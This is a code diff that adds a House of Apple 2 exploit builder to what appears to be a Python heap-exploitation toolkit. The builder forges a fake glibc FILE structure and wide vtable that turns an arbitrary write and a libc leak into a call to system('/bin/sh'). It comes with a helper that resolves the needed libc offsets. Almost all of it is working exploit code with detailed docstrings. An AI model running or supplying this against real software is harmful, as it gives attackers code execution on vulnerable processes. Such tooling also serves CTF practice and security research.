@@ -160,3 +160,60 @@ def groom_adjacent(req: int, n: int = 2) -> dict:
     return {"ops": [("alloc", f"C{i}", req) for i in range(n)],
             "chunk_size": request2size(req),
             "result": f"C0..C{n - 1} are adjacent, each {hex(request2size(req))} apart."}
+
+
+# --- House of Apple 2: arbitrary write + libc leak -> shell on modern glibc (>= 2.34) -----------
+import struct as _struct   # noqa: E402
+
+# Fixed _IO_FILE / _IO_wide_data field offsets (stable across glibc; verified live on 2.35-2.43).
+_F_FLAGS, _F_WRITE_BASE, _F_WRITE_PTR = 0x00, 0x20, 0x28
+_F_BUF_BASE, _F_LOCK, _F_WIDE_DATA, _F_VTABLE = 0x38, 0x88, 0xA0, 0xD8
+_WD_BUF_BASE, _WD_VTABLE = 0x30, 0xE0                 # inside the _IO_wide_data
+_JT_DOALLOCATE = 0x68                                 # __doallocate slot in an _IO_jump_t
+
+
+def build_house_of_apple2(write_addr: int, *, wfile_jumps: int, system: int,
+                          command: bytes = b" /bin/sh") -> bytes:
+    """A fake _IO_FILE (House of Apple 2) that turns an ARBITRARY WRITE over `_IO_2_1_stdout_` plus
+    a libc leak into a call to system(command) -- the modern-glibc replacement for the removed
+    __free_hook. When a FILE is flushed (exit(), fflush, or the next buffered write), glibc walks
+    _IO_list_all and calls `_IO_OVERFLOW(fp)`; with the vtable pointed at `_IO_wfile_jumps` that is
+    `_IO_wfile_overflow` -> `_IO_wdoallocbuf` -> `fp->_wide_data->_wide_vtable->__doallocate(fp)`,
+    a controlled call with rdi == fp. Point __doallocate at `system` and the call is system(fp);
+    since fp is this struct, its first bytes ARE the command (a leading space keeps the flag bits
+    the overflow path checks -- NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING -- clear).
+
+    Returns the bytes to write at `write_addr` (== the runtime address of `_IO_2_1_stdout_`); the
+    fake `_IO_wide_data` and wide vtable are laid out self-contained within the same blob."""
+    assert command[:1] in (b" ", b"\t") and not (command[0] & 0x80A), \
+        "command's first byte must keep _flags' NO_WRITES/UNBUFFERED/CURRENTLY_PUTTING bits clear"
+    wide_data = write_addr + 0xE0
+    wide_vt = write_addr + 0x200
+    lock = write_addr + 0x2A0                          # a zeroed, writable 8 bytes (in this blob)
+    blob = bytearray(b"\x00" * 0x300)
+
+    def w(off, val):
+        blob[off:off + 8] = _struct.pack("<Q", val & 0xFFFFFFFFFFFFFFFF)
+
+    blob[0:len(command)] = command                     # _flags == the command string
+    w(_F_WRITE_BASE, 0)
+    w(_F_WRITE_PTR, 1)                                 # write_ptr > write_base -> flush calls overflow
+    w(_F_BUF_BASE, 0)
+    w(_F_LOCK, lock)
+    w(_F_WIDE_DATA, wide_data)
+    w(_F_VTABLE, wfile_jumps)
+    w(0xE0 + _WD_BUF_BASE, 0)                          # wide _IO_buf_base == 0 -> take the allocate path
+    w(0xE0 + _WD_VTABLE, wide_vt)
+    w(0x200 + _JT_DOALLOCATE, system)                 # the controlled call target
+    return bytes(blob)
+
+
+def house_of_apple2_targets(libc_data: bytes) -> dict:
+    """The libc offsets House of Apple 2 needs: the FILE to corrupt (`_IO_2_1_stdout_`), the vtable
+    (`_IO_wfile_jumps`) and `system`. Relocate each by the leaked libc base. {} if any is absent."""
+    from . import rop
+    s = rop.libc_symbols(libc_data, ("_IO_2_1_stdout_", "_IO_wfile_jumps", "system"))
+    if not all(k in s for k in ("_IO_2_1_stdout_", "_IO_wfile_jumps", "system")):
+        return {}
+    return {"stdout": s["_IO_2_1_stdout_"], "wfile_jumps": s["_IO_wfile_jumps"],
+            "system": s["system"]}
